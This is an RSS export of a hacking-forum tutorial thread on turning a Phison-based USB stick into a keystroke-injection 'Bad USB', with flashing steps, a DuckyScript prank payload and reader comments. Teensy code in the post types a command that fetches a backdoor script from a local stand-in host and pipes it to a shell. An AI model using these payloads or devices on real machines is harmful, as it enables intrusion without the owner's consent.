@@ -1,0 +1,577 @@
+<?xml version="1.0" encoding="UTF-8" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
+  <channel>
+    <title>Plug In To Win - DIY Bad USB [Part 3/3]</title>
+    <link>https://0x00sec.org/t/plug-in-to-win-diy-bad-usb-part-3-3/1159</link>
+    <description>Hey Mates!
+
+This time I&#39;ll tell you how you can build your own Bad USB for about 10$. It&#39;s pretty easy, but requires a compatible USB Stick.
+
+---
+## Requirements
+You&#39;ll need an USB Stick with the **Phison 2303 (2251-03)** microcontroller installed. Sadly you can&#39;t just ask in your favourite hardware shop for the installed firmware, so it&#39;s a luck game :smile:. I was lucky enough to had already a compatible one at home. You can find a list of known compatible devices [here](https://github.com/brandonlw/Psychson/wiki/Known-Supported-Devices).
+
+### How To Test The Microcontroller
+Just download the tool from [this](https://www.antspec.com/usbflashinfo/index.php) russian site. It&#39;s the first blue link :wink:. 
+&lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/2X/6/6699db948cff4f644e39e14e5501f1c238cec7b7.PNG&quot; width=&quot;416&quot; height=&quot;500&quot;&gt;
+You should get an output like this one. You see the second entry at Controller? If there would be **Phison 2303 (2251-03)** you would have won :smile:. This USB Stick is sadly incompatible.
+
+### The Build-Environment
+Now you&#39;ll have to download [Microsoft Visual Studio](https://www.visualstudio.com/downloads/) (2012 or higher) and [SDCC](http://sdcc.sourceforge.net/). They are required for the next steps.
+
+### Building The Source
+When you&#39;ve downloaded Visual Studio, you have to get the Source from [github](https://github.com/brandonlw/Psychson). Extract them and open DriveCom and EmbedPayload in Visual Studio. Now build them (Build-&gt;Build Solution).
+
+### Download A Burner Image
+The Burner Image is required for flashing the firmware later on. Again we just have a russian site, but that is no problem :wink:. Just search on the [site](http://www.usbdev.ru/files/phison/) for &quot;BN03&quot; (CTRL+ F) and download the .rar package.
+
+### Download The DuckEncoder
+If you&#39;ve followed my first part, you&#39;ll already have one installed. If not, just get it [here](https://forums.hak5.org/index.php?/topic/27257-encoder-duck-encoder-v263-released-011214/).
+
+---
+## How To Flash
+Now, that we&#39;re done with preparing our environment, we can start using the tools :slight_smile:.
+
+### Warning
+**I can not guarantee that everything will run fine. I&#39;ve never encountered any problems, but I can&#39;t promise it. Everything beyond this point is up to you!**
+
+### Custom Firmware
+Go to *\Psyschson\firmware* and run the `build.bat`. If everything went right, you should see a new folder called `bin` with different files in it. We&#39;ll need the `fw.bin` file.
+
+### Creating Your DuckyScript
+We discussed that in the earlier parts. I recommend to use something easy, like a [wallpaper prank](https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Payload---Wallpaper-prank):
+
+```
+GUI d
+DELAY 500
+PRINTSCREEN
+DELAY 100
+MENU
+DELAY 300
+STRING V
+DELAY 40
+STRING D
+DELAY 300
+GUI r
+DELAY 700
+STRING mspaint
+ENTER
+DELAY 1200
+CTRL v
+DELAY 500
+CTRL s
+DELAY 1000
+STRING %userprofile%\a.bmp
+ENTER
+DELAY 500
+ALT f
+DELAY 400
+STRING K
+DELAY 100
+STRING F
+DELAY 1000
+ALT F4
+DELAY 300
+GUI d
+```
+Now you have to encode it with the DuckEncoder as I told you in part 1. Here&#39;s a little reminding:
+`Duckencoder.jar -i &lt;input file&gt; -o &lt;output file&gt; -l &lt;language&gt;`
+
+### Embedding The Payload
+Just run our previously built EmbedPayload like this:
+
+`EmbedPayload.exe &lt;Path to Payload&gt; &lt;Path to fw.bin&gt;`
+
+Now `fw.bin` contains our payload. You can overwrite it by running `build.bat` again :wink:.
+
+### Dumping The Existing Firmware
+I recommend you to dump your existing firmware. Else you couldn&#39;t restore it, when you lost your fun at Bad USB :slight_smile:. Just use DriveCom like this:
+`DriveCom.exe /drive=&lt;letter of your USB drive&gt; /action=DumpFirmware /burner=&lt;Path to our Burner Image&gt; /firmware=&lt;Path to the original fw.bin&gt;`
+
+### Flashing Our Firmware
+Now we can flash our Stick with the modified firmware. But hold in mind that it will be complicated to get the USB back into boot mode again! See the following section for more information.
+
+Again we&#39;ll use DriveCom:
+`DriveCom.exe /drive=&lt;USB drive letter&gt; /action=SendFirmware 
+/burner=&lt;Path to our Burner Image /firmware=&lt;Path to the modified fw.bin&gt;`
+
+If some errors appear, try to use an older version of the Burner Image. In my case it fixed the issue :wink:.
+
+### Reflashing The Bad USB
+If you want to install your original firmware or a new DuckyScript, you&#39;ll have to set the USB back into boot mode again. This is not as complicated as it might look like :wink:. Because the Bad USB is a fully functional keyboard, you can&#39;t access it anymore from your computer. To bypass this, you&#39;ll have to shorten the two pins at the bottom left:
+&lt;img src=&#39;//0x00sec.s3.amazonaws.com/original/2X/6/624c4d6814fa2ffb901e9386eff1b971993072d9.jpg&#39;&gt;
+
+At this point props to @anon79434934 for helping me out with the hardware part :slight_smile:.
+
+---
+## Teensy LC
+After my first part, I&#39;ve written with @0x00pf, who already got a Bad USB working by programming a [Teensy LC](https://www.pjrc.com/teensy/teensyLC.html). He did some great work! The following is an equal program - like the one I discussed in my first part - for the Teensy by @0x00pf:
+
+```
+void release_keys (void)
+{
+ // Release all keys
+  Keyboard.set_modifier (0);  
+  Keyboard.send_now();
+  delay (100);
+}
+
+void setup() {
+  // put your setup code here, to run once:
+  delay (1000);
+  // Launch terminal (GNOME CTRL+ALT+t)
+  Keyboard.set_modifier (MODIFIERKEY_CTRL | MODIFIERKEY_ALT);
+  Keyboard.send_now();
+  delay (100);
+  
+  Keyboard.press(KEY_T);
+  Keyboard.release(KEY_T);
+  delay (500); // Wait for the terminal to come up
+  
+  release_keys ();
+ 
+  // Send Command
+  Keyboard.println(&quot;curl -s http://127.0.0.1:8000/bd.sh | /bin/sh&quot;);
+
+  // Close terminal (CTRL+D)
+  Keyboard.set_modifier (MODIFIERKEY_CTRL);
+  Keyboard.send_now();
+  delay (100);
+  Keyboard.press(KEY_D);
+  Keyboard.release(KEY_D);
+  delay (100);
+  release_keys ();
+  
+}
+```
+Maybe he&#39;s already working on a part about using a Teensy for installing ring0 malware? We&#39;ll see... :wink:
+
+---
+## Conclusion
+This DIY Bad USB is more like a PoC, because you always have to shorten the two pins for flashing the firmware, which can be annoying :smile:. Anyway, I hope you enjoyed this short series and are as excited for @0x00pf&#39;s part as I am :smile:.
+
+|-TheDoctor-|</description>
+    
+    <lastBuildDate>Thu, 12 Jan 2017 17:30:55 +0000</lastBuildDate>
+    <category>Hardware</category>
+    <atom:link href="https://0x00sec.org/t/plug-in-to-win-diy-bad-usb-part-3-3/1159.rss" rel="self" type="application/rss+xml" />
+      <item>
+        <title>Plug In To Win - DIY Bad USB [Part 3/3]</title>
+        <dc:creator><![CDATA[system]]></dc:creator>
+        <description><![CDATA[
+            <p>This topic was automatically closed after 30 days. New replies are no longer allowed.</p>
+          <p><a href="https://0x00sec.org/t/plug-in-to-win-diy-bad-usb-part-3-3/1159/24">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/plug-in-to-win-diy-bad-usb-part-3-3/1159/24</link>
+        <pubDate>Sun, 21 Jan 2018 00:48:00 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-1159-24</guid>
+        <source url="https://0x00sec.org/t/plug-in-to-win-diy-bad-usb-part-3-3/1159.rss">Plug In To Win - DIY Bad USB [Part 3/3]</source>
+      </item>
+      <item>
+        <title>Plug In To Win - DIY Bad USB [Part 3/3]</title>
+        <dc:creator><![CDATA[Valkyr]]></dc:creator>
+        <description><![CDATA[
+            <p>thanks sir ! I didnt seem to have read this one</p>
+          <p><a href="https://0x00sec.org/t/plug-in-to-win-diy-bad-usb-part-3-3/1159/23">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/plug-in-to-win-diy-bad-usb-part-3-3/1159/23</link>
+        <pubDate>Thu, 12 Jan 2017 17:30:55 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-1159-23</guid>
+        <source url="https://0x00sec.org/t/plug-in-to-win-diy-bad-usb-part-3-3/1159.rss">Plug In To Win - DIY Bad USB [Part 3/3]</source>
+      </item>
+      <item>
+        <title>Plug In To Win - DIY Bad USB [Part 3/3]</title>
+        <dc:creator><![CDATA[_py]]></dc:creator>
+        <description><![CDATA[
+            <p><a class="mention" href="https://0x00sec.org/u/valkyr">@Valkyr</a>: <a href="https://0x00sec.org/t/using-a-teensy-to-install-stuff-in-a-few-seconds/1161" class="inline-onebox">Using a Teensy to Install Stuff in a Few Seconds</a></p>
+          <p><a href="https://0x00sec.org/t/plug-in-to-win-diy-bad-usb-part-3-3/1159/22">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/plug-in-to-win-diy-bad-usb-part-3-3/1159/22</link>
+        <pubDate>Thu, 12 Jan 2017 17:15:15 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-1159-22</guid>
+        <source url="https://0x00sec.org/t/plug-in-to-win-diy-bad-usb-part-3-3/1159.rss">Plug In To Win - DIY Bad USB [Part 3/3]</source>
+      </item>
+      <item>
+        <title>Plug In To Win - DIY Bad USB [Part 3/3]</title>
+        <dc:creator><![CDATA[Valkyr]]></dc:creator>
+        <description><![CDATA[
+            <p>Never found a compatible usb in the stores <img src="https://0x00sec.org/images/emoji/twitter/frowning.png?v=9" title=":frowning:" class="emoji" alt=":frowning:"></p>
+          <p><a href="https://0x00sec.org/t/plug-in-to-win-diy-bad-usb-part-3-3/1159/21">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/plug-in-to-win-diy-bad-usb-part-3-3/1159/21</link>
+        <pubDate>Thu, 12 Jan 2017 17:12:24 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-1159-21</guid>
+        <source url="https://0x00sec.org/t/plug-in-to-win-diy-bad-usb-part-3-3/1159.rss">Plug In To Win - DIY Bad USB [Part 3/3]</source>
+      </item>
+      <item>
+        <title>Plug In To Win - DIY Bad USB [Part 3/3]</title>
+        <dc:creator><![CDATA[Fust3rCluck]]></dc:creator>
+        <description><![CDATA[
+            <p>Awesome, I might try this.</p>
+          <p><a href="https://0x00sec.org/t/plug-in-to-win-diy-bad-usb-part-3-3/1159/20">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/plug-in-to-win-diy-bad-usb-part-3-3/1159/20</link>
+        <pubDate>Thu, 12 Jan 2017 08:43:56 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-1159-20</guid>
+        <source url="https://0x00sec.org/t/plug-in-to-win-diy-bad-usb-part-3-3/1159.rss">Plug In To Win - DIY Bad USB [Part 3/3]</source>
+      </item>
+      <item>
+        <title>Plug In To Win - DIY Bad USB [Part 3/3]</title>
+        <dc:creator><![CDATA[pry0cc]]></dc:creator>
+        <description><![CDATA[
+            <p>I think I’m gonna give this a go.  Perhaps I already have a USB flash drive with the correct controller.</p>
+          <p><a href="https://0x00sec.org/t/plug-in-to-win-diy-bad-usb-part-3-3/1159/19">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/plug-in-to-win-diy-bad-usb-part-3-3/1159/19</link>
+        <pubDate>Thu, 12 Jan 2017 08:34:47 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-1159-19</guid>
+        <source url="https://0x00sec.org/t/plug-in-to-win-diy-bad-usb-part-3-3/1159.rss">Plug In To Win - DIY Bad USB [Part 3/3]</source>
+      </item>
+      <item>
+        <title>Plug In To Win - DIY Bad USB [Part 3/3]</title>
+        <dc:creator><![CDATA[Valkyr]]></dc:creator>
+        <description><![CDATA[
+            <p>Thanks for the reply. My main reason for asking, was that I found a Kingston DataTraveler G4 64 GB on the known supported devices list, which is widely sold here in Belgium, for about 20€. Was trying to decide what to buy.</p>
+          <p><a href="https://0x00sec.org/t/plug-in-to-win-diy-bad-usb-part-3-3/1159/18">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/plug-in-to-win-diy-bad-usb-part-3-3/1159/18</link>
+        <pubDate>Mon, 24 Oct 2016 08:45:38 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-1159-18</guid>
+        <source url="https://0x00sec.org/t/plug-in-to-win-diy-bad-usb-part-3-3/1159.rss">Plug In To Win - DIY Bad USB [Part 3/3]</source>
+      </item>
+      <item>
+        <title>Plug In To Win - DIY Bad USB [Part 3/3]</title>
+        <dc:creator><![CDATA[anon79434934]]></dc:creator>
+        <description><![CDATA[
+            <p><a class="mention" href="https://0x00sec.org/u/thedoctor">@TheDoctor</a> is right, I don’t own a USB like that myself. But I am pretty sure you can buy a ducky in Belgium. If not, you can order one from the US and get it shipped over.</p>
+<p>-Phoenix750</p>
+          <p><a href="https://0x00sec.org/t/plug-in-to-win-diy-bad-usb-part-3-3/1159/17">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/plug-in-to-win-diy-bad-usb-part-3-3/1159/17</link>
+        <pubDate>Sun, 23 Oct 2016 19:37:54 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-1159-17</guid>
+        <source url="https://0x00sec.org/t/plug-in-to-win-diy-bad-usb-part-3-3/1159.rss">Plug In To Win - DIY Bad USB [Part 3/3]</source>
+      </item>
+      <item>
+        <title>Plug In To Win - DIY Bad USB [Part 3/3]</title>
+        <dc:creator><![CDATA[pry0cc]]></dc:creator>
+        <description><![CDATA[
+            <p>When this was released I didn’t have a chance to check this out - but this is insanely cool.  So grateful to have such a badass community!</p>
+          <p><a href="https://0x00sec.org/t/plug-in-to-win-diy-bad-usb-part-3-3/1159/16">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/plug-in-to-win-diy-bad-usb-part-3-3/1159/16</link>
+        <pubDate>Sun, 23 Oct 2016 18:35:14 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-1159-16</guid>
+        <source url="https://0x00sec.org/t/plug-in-to-win-diy-bad-usb-part-3-3/1159.rss">Plug In To Win - DIY Bad USB [Part 3/3]</source>
+      </item>
+      <item>
+        <title>Plug In To Win - DIY Bad USB [Part 3/3]</title>
+        <dc:creator><![CDATA[TheDoctor]]></dc:creator>
+        <description><![CDATA[
+            <p><a class="mention" href="https://0x00sec.org/u/anon79434934">@anon79434934</a> only helped me out theoretically. He hasn’t tested this out hisself.</p>
+<p>If I understood your question right, else ignore me <img src="https://0x00sec.org/images/emoji/twitter/grin.png?v=9" title=":grin:" class="emoji" alt=":grin:">.</p>
+          <p><a href="https://0x00sec.org/t/plug-in-to-win-diy-bad-usb-part-3-3/1159/15">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/plug-in-to-win-diy-bad-usb-part-3-3/1159/15</link>
+        <pubDate>Sun, 23 Oct 2016 17:26:15 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-1159-15</guid>
+        <source url="https://0x00sec.org/t/plug-in-to-win-diy-bad-usb-part-3-3/1159.rss">Plug In To Win - DIY Bad USB [Part 3/3]</source>
+      </item>
+      <item>
+        <title>Plug In To Win - DIY Bad USB [Part 3/3]</title>
+        <dc:creator><![CDATA[Valkyr]]></dc:creator>
+        <description><![CDATA[
+            <p>phoenix, knowing we live in the same country, did you purchase a ducky, or a usb stick to try this out ? if so, what were your experiences ?</p>
+          <p><a href="https://0x00sec.org/t/plug-in-to-win-diy-bad-usb-part-3-3/1159/14">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/plug-in-to-win-diy-bad-usb-part-3-3/1159/14</link>
+        <pubDate>Sun, 23 Oct 2016 14:00:06 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-1159-14</guid>
+        <source url="https://0x00sec.org/t/plug-in-to-win-diy-bad-usb-part-3-3/1159.rss">Plug In To Win - DIY Bad USB [Part 3/3]</source>
+      </item>
+      <item>
+        <title>Plug In To Win - DIY Bad USB [Part 3/3]</title>
+        <dc:creator><![CDATA[anon79434934]]></dc:creator>
+        <description><![CDATA[
+            <p>Good job on this, <a class="mention" href="https://0x00sec.org/u/thedoctor">@TheDoctor</a>. If ya got any more fancy hardware projects, I’m happy to cooperate.</p>
+<p>-Phoenix750</p>
+          <p><a href="https://0x00sec.org/t/plug-in-to-win-diy-bad-usb-part-3-3/1159/13">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/plug-in-to-win-diy-bad-usb-part-3-3/1159/13</link>
+        <pubDate>Sat, 08 Oct 2016 17:30:26 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-1159-13</guid>
+        <source url="https://0x00sec.org/t/plug-in-to-win-diy-bad-usb-part-3-3/1159.rss">Plug In To Win - DIY Bad USB [Part 3/3]</source>
+      </item>
+      <item>
+        <title>Plug In To Win - DIY Bad USB [Part 3/3]</title>
+        <dc:creator><![CDATA[FFY00]]></dc:creator>
+        <description><![CDATA[
+            <p>Yeah, I will do when I have some time.</p>
+          <p><a href="https://0x00sec.org/t/plug-in-to-win-diy-bad-usb-part-3-3/1159/12">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/plug-in-to-win-diy-bad-usb-part-3-3/1159/12</link>
+        <pubDate>Sat, 08 Oct 2016 11:57:13 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-1159-12</guid>
+        <source url="https://0x00sec.org/t/plug-in-to-win-diy-bad-usb-part-3-3/1159.rss">Plug In To Win - DIY Bad USB [Part 3/3]</source>
+      </item>
+      <item>
+        <title>Plug In To Win - DIY Bad USB [Part 3/3]</title>
+        <dc:creator><![CDATA[SmartOne]]></dc:creator>
+        <description><![CDATA[
+            <p>Sounds interesting! If you don’t mind, you could write a post about it! <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"></p>
+          <p><a href="https://0x00sec.org/t/plug-in-to-win-diy-bad-usb-part-3-3/1159/11">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/plug-in-to-win-diy-bad-usb-part-3-3/1159/11</link>
+        <pubDate>Sat, 08 Oct 2016 11:55:34 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-1159-11</guid>
+        <source url="https://0x00sec.org/t/plug-in-to-win-diy-bad-usb-part-3-3/1159.rss">Plug In To Win - DIY Bad USB [Part 3/3]</source>
+      </item>
+      <item>
+        <title>Plug In To Win - DIY Bad USB [Part 3/3]</title>
+        <dc:creator><![CDATA[FFY00]]></dc:creator>
+        <description><![CDATA[
+            <p><a class="mention" href="https://0x00sec.org/u/smartone">@SmartOne</a> not quite. I didn’t use the teensy to do the same thing than you but I used the same concept.</p>
+          <p><a href="https://0x00sec.org/t/plug-in-to-win-diy-bad-usb-part-3-3/1159/10">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/plug-in-to-win-diy-bad-usb-part-3-3/1159/10</link>
+        <pubDate>Sat, 08 Oct 2016 11:53:58 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-1159-10</guid>
+        <source url="https://0x00sec.org/t/plug-in-to-win-diy-bad-usb-part-3-3/1159.rss">Plug In To Win - DIY Bad USB [Part 3/3]</source>
+      </item>
+      <item>
+        <title>Plug In To Win - DIY Bad USB [Part 3/3]</title>
+        <dc:creator><![CDATA[SmartOne]]></dc:creator>
+        <description><![CDATA[
+            <p>Hi <a class="mention" href="https://0x00sec.org/u/ffy00">@FFY00</a>,</p>
+<p>Just want to ensure you didn’t get me wrong <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"> My idea was to check if any plugged-in USB has the Phison microcontroller and the overwrite it with the BadUSB firmware. Did you accomplish this?</p>
+          <p><a href="https://0x00sec.org/t/plug-in-to-win-diy-bad-usb-part-3-3/1159/9">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/plug-in-to-win-diy-bad-usb-part-3-3/1159/9</link>
+        <pubDate>Sat, 08 Oct 2016 11:47:21 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-1159-9</guid>
+        <source url="https://0x00sec.org/t/plug-in-to-win-diy-bad-usb-part-3-3/1159.rss">Plug In To Win - DIY Bad USB [Part 3/3]</source>
+      </item>
+      <item>
+        <title>Plug In To Win - DIY Bad USB [Part 3/3]</title>
+        <dc:creator><![CDATA[FFY00]]></dc:creator>
+        <description><![CDATA[
+            <p>I’ve already done this with the Teensy 3.2</p>
+<p>You should check this also: <a href="https://github.com/samyk/usbdriveby" rel="nofollow noopener">https://github.com/samyk/usbdriveby</a></p>
+          <p><a href="https://0x00sec.org/t/plug-in-to-win-diy-bad-usb-part-3-3/1159/8">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/plug-in-to-win-diy-bad-usb-part-3-3/1159/8</link>
+        <pubDate>Sat, 08 Oct 2016 10:57:03 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-1159-8</guid>
+        <source url="https://0x00sec.org/t/plug-in-to-win-diy-bad-usb-part-3-3/1159.rss">Plug In To Win - DIY Bad USB [Part 3/3]</source>
+      </item>
+      <item>
+        <title>Plug In To Win - DIY Bad USB [Part 3/3]</title>
+        <dc:creator><![CDATA[SmartOne]]></dc:creator>
+        <description><![CDATA[
+            <p>Thank you for the clarification! I always had a dream of a “virus” that turns plugged in usb’s into bad usbs, but that doesn’t seem possible <img src="https://0x00sec.org/images/emoji/twitter/stuck_out_tongue_winking_eye.png?v=9" title=":stuck_out_tongue_winking_eye:" class="emoji" alt=":stuck_out_tongue_winking_eye:"></p>
+          <p><a href="https://0x00sec.org/t/plug-in-to-win-diy-bad-usb-part-3-3/1159/7">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/plug-in-to-win-diy-bad-usb-part-3-3/1159/7</link>
+        <pubDate>Mon, 03 Oct 2016 19:18:12 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-1159-7</guid>
+        <source url="https://0x00sec.org/t/plug-in-to-win-diy-bad-usb-part-3-3/1159.rss">Plug In To Win - DIY Bad USB [Part 3/3]</source>
+      </item>
+      <item>
+        <title>Plug In To Win - DIY Bad USB [Part 3/3]</title>
+        <dc:creator><![CDATA[0x00pf]]></dc:creator>
+        <description><![CDATA[
+            <p>Hey <a class="mention" href="https://0x00sec.org/u/smartone">@SmartOne</a>, if you try to search for USB Flash controllers datasheets you will not find many that can be flashed over the USB interface. Many have some special interface (you have to hook up wires in those little pins) and most of them requires some proprietary tools that you only get if you are a manufacturer of… USB devices.</p>
+<p>In general, those microntrollers can <em>speak</em> the USB protocol. If you can change the firmware to make it identify as a different device, you are done. Despite of not being trivial (I guess, I have never done it) to re-write such a firmware you also need the details on how to flash it. This is the kind of information/tools that are available for the Phision</p>
+          <p><a href="https://0x00sec.org/t/plug-in-to-win-diy-bad-usb-part-3-3/1159/6">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/plug-in-to-win-diy-bad-usb-part-3-3/1159/6</link>
+        <pubDate>Mon, 03 Oct 2016 19:14:02 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-1159-6</guid>
+        <source url="https://0x00sec.org/t/plug-in-to-win-diy-bad-usb-part-3-3/1159.rss">Plug In To Win - DIY Bad USB [Part 3/3]</source>
+      </item>
+      <item>
+        <title>Plug In To Win - DIY Bad USB [Part 3/3]</title>
+        <dc:creator><![CDATA[SmartOne]]></dc:creator>
+        <description><![CDATA[
+            <p>A question that <a class="mention" href="https://0x00sec.org/u/0x00pf">@0x00pf</a> may be able to answer: Why does the hack only possible with the Phison microcontroller? Is it the only one vulnerable or did no one create “hacks” for other microcontrollers?<br>
+Anyway, great post! <img src="https://0x00sec.org/images/emoji/twitter/thumbsup.png?v=9" title=":thumbsup:" class="emoji" alt=":thumbsup:"></p>
+          <p><a href="https://0x00sec.org/t/plug-in-to-win-diy-bad-usb-part-3-3/1159/5">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/plug-in-to-win-diy-bad-usb-part-3-3/1159/5</link>
+        <pubDate>Mon, 03 Oct 2016 18:43:07 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-1159-5</guid>
+        <source url="https://0x00sec.org/t/plug-in-to-win-diy-bad-usb-part-3-3/1159.rss">Plug In To Win - DIY Bad USB [Part 3/3]</source>
+      </item>
+      <item>
+        <title>Plug In To Win - DIY Bad USB [Part 3/3]</title>
+        <dc:creator><![CDATA[Derfloink]]></dc:creator>
+        <description><![CDATA[
+            <p>I mean faster typing but now I know <img src="https://0x00sec.org/images/emoji/twitter/sweat_smile.png?v=9" title=":sweat_smile:" class="emoji" alt=":sweat_smile:"></p>
+          <p><a href="https://0x00sec.org/t/plug-in-to-win-diy-bad-usb-part-3-3/1159/4">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/plug-in-to-win-diy-bad-usb-part-3-3/1159/4</link>
+        <pubDate>Mon, 03 Oct 2016 16:48:49 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-1159-4</guid>
+        <source url="https://0x00sec.org/t/plug-in-to-win-diy-bad-usb-part-3-3/1159.rss">Plug In To Win - DIY Bad USB [Part 3/3]</source>
+      </item>
+      <item>
+        <title>Plug In To Win - DIY Bad USB [Part 3/3]</title>
+        <dc:creator><![CDATA[TheDoctor]]></dc:creator>
+        <description><![CDATA[
+            <p>What do you mean with “faster”?<br>
+Faster for installing new payloads? No.<br>
+Faster data transmission? I don’t know.<br>
+Faster typing? No.</p>
+<p>Please specify <img src="https://0x00sec.org/images/emoji/twitter/smile.png?v=9" title=":smile:" class="emoji" alt=":smile:">.</p>
+          <p><a href="https://0x00sec.org/t/plug-in-to-win-diy-bad-usb-part-3-3/1159/3">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/plug-in-to-win-diy-bad-usb-part-3-3/1159/3</link>
+        <pubDate>Mon, 03 Oct 2016 16:46:18 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-1159-3</guid>
+        <source url="https://0x00sec.org/t/plug-in-to-win-diy-bad-usb-part-3-3/1159.rss">Plug In To Win - DIY Bad USB [Part 3/3]</source>
+      </item>
+      <item>
+        <title>Plug In To Win - DIY Bad USB [Part 3/3]</title>
+        <dc:creator><![CDATA[Derfloink]]></dc:creator>
+        <description><![CDATA[
+            <p>This is kind of awesome! But one question is there: Is the DIY one faster or the Ducky? I’m also hope <a class="mention" href="https://0x00sec.org/u/0x00pf">@0x00pf</a> article will be there in some time <img src="https://0x00sec.org/images/emoji/twitter/smile.png?v=9" title=":smile:" class="emoji" alt=":smile:"></p>
+          <p><a href="https://0x00sec.org/t/plug-in-to-win-diy-bad-usb-part-3-3/1159/2">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/plug-in-to-win-diy-bad-usb-part-3-3/1159/2</link>
+        <pubDate>Mon, 03 Oct 2016 11:13:10 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-1159-2</guid>
+        <source url="https://0x00sec.org/t/plug-in-to-win-diy-bad-usb-part-3-3/1159.rss">Plug In To Win - DIY Bad USB [Part 3/3]</source>
+      </item>
+      <item>
+        <title>Plug In To Win - DIY Bad USB [Part 3/3]</title>
+        <dc:creator><![CDATA[TheDoctor]]></dc:creator>
+        <description><![CDATA[
+            <p>Hey Mates!</p>
+<p>This time I’ll tell you how you can build your own Bad USB for about 10$. It’s pretty easy, but requires a compatible USB Stick.</p>
+<hr>
+<h2>Requirements</h2>
+<p>You’ll need an USB Stick with the <strong>Phison 2303 (2251-03)</strong> microcontroller installed. Sadly you can’t just ask in your favourite hardware shop for the installed firmware, so it’s a luck game <img src="https://0x00sec.org/images/emoji/twitter/smile.png?v=9" title=":smile:" class="emoji" alt=":smile:">. I was lucky enough to had already a compatible one at home. You can find a list of known compatible devices <a href="https://github.com/brandonlw/Psychson/wiki/Known-Supported-Devices" rel="noopener nofollow ugc">here</a>.</p>
+<h3>How To Test The Microcontroller</h3>
+<p>Just download the tool from <a href="https://www.antspec.com/usbflashinfo/index.php" rel="noopener nofollow ugc">this</a> russian site. It’s the first blue link <img src="https://0x00sec.org/images/emoji/twitter/wink.png?v=9" title=":wink:" class="emoji" alt=":wink:">.<br>
+<img src="//0x00sec.s3.amazonaws.com/original/2X/6/6699db948cff4f644e39e14e5501f1c238cec7b7.PNG" width="416" height="500"><br>
+You should get an output like this one. You see the second entry at Controller? If there would be <strong>Phison 2303 (2251-03)</strong> you would have won <img src="https://0x00sec.org/images/emoji/twitter/smile.png?v=9" title=":smile:" class="emoji" alt=":smile:">. This USB Stick is sadly incompatible.</p>
+<h3>The Build-Environment</h3>
+<p>Now you’ll have to download <a href="https://www.visualstudio.com/downloads/" rel="noopener nofollow ugc">Microsoft Visual Studio</a> (2012 or higher) and <a href="http://sdcc.sourceforge.net/" rel="noopener nofollow ugc">SDCC</a>. They are required for the next steps.</p>
+<h3>Building The Source</h3>
+<p>When you’ve downloaded Visual Studio, you have to get the Source from <a href="https://github.com/brandonlw/Psychson" rel="noopener nofollow ugc">github</a>. Extract them and open DriveCom and EmbedPayload in Visual Studio. Now build them (Build-&gt;Build Solution).</p>
+<h3>Download A Burner Image</h3>
+<p>The Burner Image is required for flashing the firmware later on. Again we just have a russian site, but that is no problem <img src="https://0x00sec.org/images/emoji/twitter/wink.png?v=9" title=":wink:" class="emoji" alt=":wink:">. Just search on the <a href="http://www.usbdev.ru/files/phison/" rel="noopener nofollow ugc">site</a> for “BN03” (CTRL+ F) and download the .rar package.</p>
+<h3>Download The DuckEncoder</h3>
